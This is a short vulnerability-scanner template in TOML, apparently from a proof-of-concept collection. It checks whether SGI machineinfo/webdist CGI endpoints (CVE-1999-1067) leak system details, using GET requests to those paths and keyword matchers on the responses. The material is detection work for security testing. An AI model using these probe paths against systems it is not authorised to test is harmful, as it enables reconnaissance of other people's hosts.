[info]
author = "ave"
description = "检测 SGI MachineInfo CGI 程序 (webdist.cgi/machineinfo.cgi) 是否泄露敏感系统状态信息"
id = "POC-AVE-1999-1316"
name = "CVE-1999-1067 PoC"
severity = "medium"
tags = ["ave-1999-1316"]
vuln_id = [
    "CVE-1999-1067",
    "AVE-1999-1316",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/webdist.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "machineinfo",
    "system status",
    "system information",
    "hostname",
    "os version",
    "cpu",
    "memory",
    "disk",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/machineinfo.cgi"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "machineinfo",
    "system status",
    "system information",
    "hostname",
    "os version",
    "cpu",
    "memory",
    "disk",
]

[[poc.requests]]
method = "GET"
path = "/cgi-bin/webdist.cgi?page=machineinfo"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "machineinfo",
    "system status",
    "system information",
    "hostname",
    "os version",
    "cpu",
    "memory",
    "disk",
]
